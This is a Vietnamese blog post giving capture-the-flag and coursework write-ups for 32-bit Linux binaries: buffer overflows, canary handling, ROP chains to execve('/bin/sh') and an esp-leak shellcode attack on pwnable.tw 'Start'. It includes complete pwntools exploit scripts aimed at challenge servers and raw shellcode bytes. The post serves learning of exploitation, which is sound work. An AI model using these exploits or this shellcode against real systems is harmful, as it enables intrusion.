<!doctype html>
<html lang="en-us">
  <head>
    <title>Phaphajian // DatNLQ</title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.88.1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="DatNLQ" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="https://datnlq.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Phaphajian"/>
<meta name="twitter:description" content="Welcome đến với deadline của PhaPhaJian ! Đầy là 1 trong những deadline của mình trên trường do anh PhaPhaJian cho mình trên lớp, cũng là 1 dịp để quay lại những kỹ thuật mà mình đã học qua lúc trước
rop2 Rop2 - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006 Đầu tiên chúng ta bước vào 1 thủ tục mà các pwner đều sẽ làm khi gặp 1 bài pwn đó chính là file và checksec để kiểm tra thông tin cung các cơ chế bảo vệ của file :"/>

    <meta property="og:title" content="Phaphajian" />
<meta property="og:description" content="Welcome đến với deadline của PhaPhaJian ! Đầy là 1 trong những deadline của mình trên trường do anh PhaPhaJian cho mình trên lớp, cũng là 1 dịp để quay lại những kỹ thuật mà mình đã học qua lúc trước
rop2 Rop2 - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006 Đầu tiên chúng ta bước vào 1 thủ tục mà các pwner đều sẽ làm khi gặp 1 bài pwn đó chính là file và checksec để kiểm tra thông tin cung các cơ chế bảo vệ của file :" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://datnlq.github.io/posts/phaphajian/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-07T22:54:13+07:00" />
<meta property="article:modified_time" content="2021-11-07T22:54:13+07:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://datnlq.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="DatNLQ" /></a>
      <h1>DatNLQ</h1>
      <p>DatNLQ&#39;s personal website</p>
      <div class="app-header-social">
        
          <a href="https://github.com/datnlq" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>My Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Phaphajian</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Nov 7, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          10 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="welcome-đến-với-deadline-của-phaphajian-">Welcome đến với deadline của PhaPhaJian !</h2>
<p>Đầy là 1 trong những deadline của mình trên trường do anh PhaPhaJian cho mình trên lớp, cũng là 1 dịp để quay lại những kỹ thuật mà mình đã học qua lúc trước</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/Phaphajian.jpg?raw=true" alt="img"></p>
<h3 id="rop2">rop2</h3>
<h5 id="rop2httpsuithcm-mysharepointcomugpersonalinseclab_hcmuit_edu_vneyd3uu7oca1dipbndbg32lkba8ysq2gqjniob6grklwasgeunvgyj---x86---ret2textret2syscall-nc-4512224968-10006"><a href="https://uithcm-my.sharepoint.com/:u:/g/personal/inseclab_hcmuit_edu_vn/EYd3UU7ocA1DipbNdbG32lkBa8ySQ2GQjnIOB6grKLWaSg?e=uNvgYj">Rop2</a> - x86 - ret2text/ret2syscall: nc 45.122.249.68 10006</h5>
<p>Đầu tiên chúng ta bước vào 1 thủ tục mà các pwner đều sẽ làm khi gặp 1 bài pwn đó chính là file và checksec để kiểm tra thông tin cung các cơ chế bảo vệ của file :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_filechecksec.png?raw=true" alt="img"></p>
<p>Từ thông tin ở trên chúng ta thấy được vài điểm sau :</p>
<ul>
<li>Là file ELF 32 bit +  statically linked : Các tệp được statically linked được &lsquo;locked&rsquo; với file binary tại thời điểm liên kết để chúng không bao giờ thay đổỉ.</li>
<li>Stack Canary found : Option này là cho chúng ta biết rằng cơ chế Canary đã được bật lên</li>
<li>NX enabled : Option này là không cho phép thực thi câu lệnh trên stack</li>
</ul>
<p>Hhmmm đã có thông tin của bài này rồi, thì chúng ta có thể dùng IDA Pro để check flow của nó xem chúng ta khai thác như nào nhé :lau:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+0h] [ebp-Ch]

  setvbuf(stdout, 0, 2, 0);
  v4 = getegid();
  setresgid(v4, v4, v4);
  vuln();
  return 0;
}
</code></pre></div><p>Xem mã giã chúng ta thấy được bài không có gì bất thường :| cho tới khi gọi hàm vuln</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int vuln()
{
  char v1[20]; // [esp+0h] [ebp-18h] BYREF

  puts(&#34;Can you ROP your way out of this one?&#34;);
  return gets(v1);
}
</code></pre></div><p>Vào trong hàm Vuln chúng ta có thể thấy được hàm đang gọi hàm gets(s1) với s1 size == 20. Chúng ta có thể thấy được đây chính là lỗi bof nè</p>
<p>Sau khi dùng IDA đi 1 vòng thì ta nhận ra vấn đề như sau :</p>
<ul>
<li>Lỗ hổng chúng ta khai thác lần này là Bof</li>
<li>Không có hàm flag hay hàm /bin/sh nào hết</li>
<li>Offset đầu tiên là 20</li>
</ul>
<p>Dựa vào 2 lần phân tích trên chúng ta có thể đưa ra các hướng exploit như là ret2syscall, ret2text, ROPgadget, &hellip; Tuy nhiên lần này ta sẽ sử dụng ROPgadget cho lẹ nhé Hehe</p>
<p>Đã xác định được hướng đi của mình thì giờ chúng ta sang phần bypass canary và viết ROP, 1 ROP cơ bản như sau :</p>
<p>Để leak được canary vì là chỉ có statically linked nên canary sẽ không bị thay đổi, nên chúng a có thể mở gdb lên để leak canary như sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_gdb_ret.png?raw=true" alt="img"></p>
<p>Disassemble vuln và đặt breakpoint ở hàm gets, nhập vào 20 ký tự &ldquo;a&rdquo;.</p>
<p>Sử dụng câu lệnh x/100x $esp để show stack frame cho chúng ta quan sát, chúng ta thấy được như sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_gdb_checkstack.png?raw=true" alt="img"></p>
<ul>
<li>Offset = 20</li>
<li>Canary = 0x080da000</li>
<li>Save base pointer = 0xffffd008
Sau đó mới tới phần return address .</li>
</ul>
<p>Từ đó chúng ta chuyển sang phần viết ROP.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
</code></pre></div><p>Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_popeax.png?raw=true" alt="img"></p>
<p>Tuy nhiên mọi chuyện đâu có dễ dàng như thế, trong pop eax; ret chúng ta có thể thấy 1 byte là 0x0a đây là 1 bad byte đối với hàm gets, vì khi nhận byte này hàm gets sẽ nhận dạng nó là byte xuống dòng và kết thúc cái ROP của chúng ta
Haizz badbyte like badboiz :|</p>
<p>Thế là chúng ta có thể viết 1 cái rop khác không sử dụng pop eax;ret tuy nhiên điều này cần kiến thức về asm khá vững, còn mình thì &hellip;&hellip; vừa không vững vừa lười nên mình đã quyết định đi 1 con đường khá táo bạo
sử dụng option bad bytes của tool ROPgadget.</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_ropgadgetbadbyte.png?raw=true" alt="img"></p>
<p>Như thế chúng ta đã có được 1 gadget rồi.</p>
<p>Gom 7749 thông tin phân tích được ở trên kia lại thành cái file exploit này nè :D</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
from struct import pack


BIN = &#34;./rop2&#34;
 
###ROP  --binary ./rop2 --rop --badbytes &#34;0a&#34;
p = b&#39;&#39;

p += pack(&#39;&lt;I&#39;, 0x0806ee6b) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da060) # @ .data
p += pack(&#39;&lt;I&#39;, 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b&#39;/bin&#39;
p += pack(&#39;&lt;I&#39;, 0x080da060) # padding without overwrite edx
p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
p += pack(&#39;&lt;I&#39;, 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806ee6b) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da064) # @ .data + 4
p += pack(&#39;&lt;I&#39;, 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += b&#39;//sh&#39;
p += pack(&#39;&lt;I&#39;, 0x080da064) # padding without overwrite edx
p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
p += pack(&#39;&lt;I&#39;, 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0806ee6b) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da068) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0x08056420) # xor eax, eax ; ret
p += pack(&#39;&lt;I&#39;, 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack(&#39;&lt;I&#39;, 0x080481c9) # pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da060) # @ .data
p += pack(&#39;&lt;I&#39;, 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da068) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0x080da060) # padding without overwrite ebx
p += pack(&#39;&lt;I&#39;, 0x0806ee6b) # pop edx ; ret
p += pack(&#39;&lt;I&#39;, 0x080da068) # @ .data + 8
p += pack(&#39;&lt;I&#39;, 0x08056420) # xor eax, eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x0807c2fa) # inc eax ; ret
p += pack(&#39;&lt;I&#39;, 0x08049563) # int 0x80
canary = 0x080da000
save_base_pointer = 0xffffd008
def exploit():
	payload = b&#34;a&#34;*20 + p32(canary) + p32(save_base_pointer) + p 
#	__breakpoint=&#34;&#34;&#34;
#		b*0x080488d0
#		&#34;&#34;&#34;
#	gdb.attach(io,__breakpoint)
	io.recvuntil(&#34;Can you ROP your way out of this one?&#34;)
	io.sendline(payload)
	io.interactive()



#io = process(BIN)
io = remote(&#34;45.122.249.68&#34;,10006)
#context.log_level=&#39;debug&#39;
exploit()


</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/rop2_flag.png?raw=true" alt="img"></p>
<h3 id="ropchain">ROPchain</h3>
<h5 id="ropchain---x86---rop-chains-nc-4512224968-10002">ROPchain - x86 - ROP chains: nc 45.122.249.68 10002</h5>
<p><a href="https://uithcm-my.sharepoint.com/personal/khoanh_hcmuit_edu_vn/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge%2FROPchain&amp;parent=%2Fpersonal%2Fkhoanh%5Fhcmuit%5Fedu%5Fvn%2FDocuments%2FTh%E1%BB%B1c%20H%C3%A0nh%2FCO%5FCHE%5FMADOC%2F2021%2FChallenge">ROPchain</a></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#include &lt;stdio.h&gt;

char shell[] = &#34;/bin/sh&#34;;
void SetBuf(){
	setvbuf(stdout,0,_IONBF,0);
	setvbuf(stdin,0,_IONBF,0);
	setvbuf(stderr,0,_IONBF,0);
}
void Vuln(){
	char buf[128];
        puts(&#34;Insert ROP chain here:&#34;);
        read (0, &amp;buf,0x100);
}
int main(){
	SetBuf();
	puts(&#34;Wanna.One&#34;);
	puts(&#34;Muon gioi phai lam viec kho&#34;);
	Vuln();
	return 0;
}

</code></pre></div><p>Đầy là 2 file source của bài này, tuy nhiên bài này có vẻ dễ hơn bài trên nhiều. Nhưng thủ tục vẫn là thủ tục :3 checksec thôi nàooo</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_checksec.png?raw=true" alt="img"></p>
<p>Từ checksec ta thấy được canary đã được bật, same same bài trên nhỉ :D , chứ còn gì nữa nên làm các bước cũng tương tự như trên đi rồi tính tiếp ha</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_IDA.png?raw=true" alt="img"></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int __cdecl main(int argc, const char **argv, const char **envp)
{
  int savedregs; // [esp+4h] [ebp+0h]

  SetBuf();
  puts();
  savedregs = 134922153;
  puts();
  Vuln();
  return 0;
}
</code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">int Vuln()
{
  char v1[132]; // [esp+0h] [ebp-88h] BYREF

  puts(&#34;Insert ROP chain here:&#34;);
  return read(0, v1, 256);
}
</code></pre></div><p>Dựa vào đoạn code trên thì có thể thấy được rằng với v1 chỉ có size là 132 nhưng hàm read lại được max là 256 byte điều đó đã xuất hiện lỗi bof rồi.</p>
<p>Sử dụng gdb để phân tích như sau</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_breakpoint.png?raw=true" alt="img"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_stackframe.png?raw=true" alt="img"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_gdb_ret.png?raw=true" alt="img"></p>
<p>Với offset từ IDA Pro chúng ta có thể dùng để xác định stack frame gồm những gì, từ đó suy ra offset.</p>
<p>Từ đó chúng ta chuyển sang phần viết ROP.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">pop eax ; ret
pop edx ; pop ecx ; pop ebx ; ret
/bin/sh
int80
</code></pre></div><p>Giờ thì dựa vào đoạn ROP trên chúng ta phải viết ra ROP phù hợp với binnary trên, nên sử dụng câu lệnh sau :</p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_ropgadget.png?raw=true" alt="img"></p>
<p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_ropgadget_binsh.png?raw=true" alt="img"></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *
from struct import pack


BIN = &#34;./ROPchain&#34;
HOST = &#34;45.122.249.68&#34; 
PORT = 10002
canary = 0x080d900a
save_base_pointer = 0xffffcff8





pop_eax = 0x080a89e6 #pop eax ; ret
pop_edx = 0x0806e051 #pop edx ; pop ecx ; pop ebx ; ret
bin_sh = 0x080d9068 #/bin/sh
int80 = 0x080495a3


def exploit():
	payload = b&#34;a&#34;*132 + p32(canary) + p32(save_base_pointer) 
	payload += p32(pop_eax) + p32(0xb)
	payload += p32(pop_edx) + p32(0) + p32(0) + p32(bin_sh)
	payload += p32(int80)
	# __breakpoint=&#34;&#34;&#34;
	# 	b*main+67
	# 	&#34;&#34;&#34;
	# gdb.attach(io,__breakpoint)
	io.recvuntil(&#34;Insert ROP chain here:&#34;)
	io.sendline(payload)
	io.interactive()

# io = process(BIN)
# context.log_level=&#39;debug&#39;
io = remote(HOST,PORT)
exploit()
</code></pre></div><p><img src="https://github.com/datnlq/Source/blob/main/PhaPhaJian/image/ROPchain_flag.png?raw=true" alt="img"></p>
<h3 id="return2libc_once">Return2LibC_Once</h3>
<h5 id="return2libc_once---x86---ret2libc-nc-4512224968-10011">Return2LibC_Once - x86 - ret2libc: nc 45.122.249.68 10011</h5>
<h1 id="pwnabletw">PWNABLE.TW</h1>
<h2 id="start">Start</h2>
<p>Đề bài cung cấp cho chúng ta 1 file chương trình trên Linux, vì vậy để biết thì chúng ta phải xem thử xem nó làm cái gì nào!
&hellip;..
Sau khi chạy thì thấy rằng chương trình in ra dòng <em>Let&rsquo;s start the CTF:</em> sau đó get chuỗi chúng ta nhập vào bằng cách nào đó, để biết được cấu trúc chương trình thì chúng ta dùng gdb để disassemble chương trình ra và được hàm _start:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">   0x08048060 &lt;+0&gt;:	push   esp
   0x08048061 &lt;+1&gt;:	push   0x804809d
   0x08048066 &lt;+6&gt;:	xor    eax,eax
   0x08048068 &lt;+8&gt;:	xor    ebx,ebx
   0x0804806a &lt;+10&gt;:	xor    ecx,ecx
   0x0804806c &lt;+12&gt;:	xor    edx,edx
   0x0804806e &lt;+14&gt;:	push   0x3a465443
   0x08048073 &lt;+19&gt;:	push   0x20656874
   0x08048078 &lt;+24&gt;:	push   0x20747261
   0x0804807d &lt;+29&gt;:	push   0x74732073
   0x08048082 &lt;+34&gt;:	push   0x2774654c
   0x08048087 &lt;+39&gt;:	mov    ecx,esp
   0x08048089 &lt;+41&gt;:	mov    dl,0x14
   0x0804808b &lt;+43&gt;:	mov    bl,0x1
   0x0804808d &lt;+45&gt;:	mov    al,0x4
   0x0804808f &lt;+47&gt;:	int    0x80
   0x08048091 &lt;+49&gt;:	xor    ebx,ebx
   0x08048093 &lt;+51&gt;:	mov    dl,0x3c
   0x08048095 &lt;+53&gt;:	mov    al,0x3
   0x08048097 &lt;+55&gt;:	int    0x80
   0x08048099 &lt;+57&gt;:	add    esp,0x14
   0x0804809c &lt;+60&gt;:	ret    

</code></pre></div><p>Như chúng ta thấy thì code asm này khá thô, code dùng những phương thức đơn giản nhất đó chính là sys_call, ví dụ khi eax = 1 thì gọi sys_exit, sys_read = 3, sys_write = 4 ,&hellip;
Về việc in ra dòng <em>Let&rsquo;s start the CTF:</em> thì chương trình chỉ push chuỗi dưới dạng hex vào stack sau đó gọi sys_write để in ra mà thôi!</p>
<p>Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để ret. Điều đó làm mình có thể suy đoán là stack này sẽ có độ dài là 0x14.</p>
<p>Vậy thì không có lỗ hổng thông thường nào như gets(), &hellip; được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
Để thực hiện được việc gọi shellcode quyền năng là &ldquo;/bin/sh&rdquo; thì chúng ta search gg có shellcode sau :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">   0:   31 c9                   xor    ecx, ecx
   2:   f7 e1                   mul    ecx
   4:   51                      push   ecx
   5:   68 2f 2f 73 68          push   0x68732f2f
   a:   68 2f 62 69 6e          push   0x6e69622f
   f:   89 e3                   mov    ebx, esp
  11:   b0 0b                   mov    al, 0xb
  13:   cd 80                   int    0x80

shellcode = b&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
</code></pre></div><p>Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh <em>&quot; 0x08048087 &lt;+39&gt;:	mov    ecx,esp&quot;</em> câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào :</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">from pwn import *

BIN = &#34;./start&#34;
DEBUG = 1

shellcode = b&#39;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#39;
addr = 0x08048087 

io = process(BIN)
context.log_level = &#39;debug&#39;
# io = remote(&#34;chall.pwnable.tw&#34;, 10000)


#_breakpoint = &#34;&#34;&#34;
#		0x08048099
#	&#34;&#34;&#34;
#gdb.attach(io,_breakpoint)
io.recvuntil(&#34;CTF:&#34;)
payload = b&#39;A&#39; * 0x14 + p32(addr)
io.send(payload)
esp_addr = u32(io.recv(4))
 
print(&#34;[+]Esp address = &#34;, hex(esp_addr))
 
payload = b&#39;A&#39; * 0x14 + p32(esp_addr + 0x14) + shellcode
io.sendline(payload)
io.interactive()
</code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
